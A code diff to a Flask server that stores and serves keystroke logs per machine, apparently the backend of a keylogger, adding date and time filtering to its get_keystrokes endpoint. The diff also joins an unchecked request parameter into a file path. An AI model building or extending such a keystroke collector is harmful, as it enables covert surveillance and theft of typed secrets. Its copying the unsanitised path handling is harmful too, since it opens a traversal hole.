@@ -5,6 +5,7 @@ from flask import Flask, request, jsonify
 from datetime import datetime
 from encryptor import Encryptor
 from flask_cors import CORS
+from datetime import datetime, time as dtime
 
 app = Flask(__name__)
 def deep_merge(source, destination):
@@ -89,24 +90,73 @@ def get_machines():
     machines = os.listdir(LOG_DIR)
     return jsonify(machines)
 
+
+
+def _ptime(s: str | None) -> dtime | None:
+    """'HH' | 'HH:MM' | 'HH:MM:SS' (כולל %3A) -> time"""
+    if not s: return None
+    s = s.replace('%3A', ':').strip()
+    for fmt in ("%H:%M:%S", "%H:%M", "%H"):
+        try: return datetime.strptime(s, fmt).time()
+        except ValueError: pass
+    return None
+
+def _hour_from_fname(fname: str) -> int | None:
+    """YYYY-MM-DD_HH.json -> HH"""
+    try:   return int(os.path.splitext(fname)[0].rsplit('_', 1)[1])
+    except: return None
+
+def _timekey(k: str) -> dtime | None:
+    """'HH:MM' | 'HH:MM:SS' -> time"""
+    if not isinstance(k, str): return None
+    for fmt in ("%H:%M:%S", "%H:%M"):
+        try: return datetime.strptime(k.strip(), fmt).time()
+        except ValueError: pass
+    return None
+
+
 @app.route('/api/get_keystrokes', methods=['GET'])
 def get_keystrokes():
-    """הוסף נקודת קצה מהשרת המרוחק"""
     machine = request.args.get("machine")
     if not machine:
         return jsonify({"error": "Missing machine"}), 400
 
-    machine_folder = os.path.join(LOG_DIR, machine)
-    if not os.path.exists(machine_folder):
-        return jsonify([])
+    date_str = request.args.get("date")        # YYYY-MM-DD
+    start_t  = _ptime(request.args.get("start")) or dtime(0, 0, 0)
+    end_t    = _ptime(request.args.get("end"))   or dtime(23, 59, 59)
+    if start_t > end_t: start_t, end_t = end_t, start_t
 
-    files = sorted(os.listdir(machine_folder))
-    data = []
-    for file in files:
-        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
-            data.append(f.read())
+    folder = os.path.join(LOG_DIR, machine)
+    if not os.path.isdir(folder): return jsonify([])
 
-    return jsonify(data)
+    files = [f for f in os.listdir(folder) if f.endswith('.json')]
+    if date_str: files = [f for f in files if f.startswith(f"{date_str}_")]
+    sh, eh = start_t.hour, end_t.hour
+    files = [f for f in files if ((h := _hour_from_fname(f)) is not None and sh <= h <= eh)]
+    files.sort()
+
+    out = []
+    for f in files:
+        p = os.path.join(folder, f)
+        try:
+            with open(p, "r", encoding="utf-8") as fh:
+                obj = json.load(fh)   # מצפה למילון { "HH:MM(:SS)": {...} }
+        except Exception:
+            with open(p, "r", encoding="utf-8") as fh:
+                out.append(fh.read())
+            continue
+
+        if not isinstance(obj, dict):
+            out.append(json.dumps(obj, ensure_ascii=False)); continue
+
+        # סינון מדויק לפי זמן (כולל הקצה end)
+        filtered = {k:v for k,v in obj.items()
+                    if (t := _timekey(k)) is None or (start_t <= t <= end_t)}
+        if filtered:
+            out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
+
+    return jsonify(out)
+
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
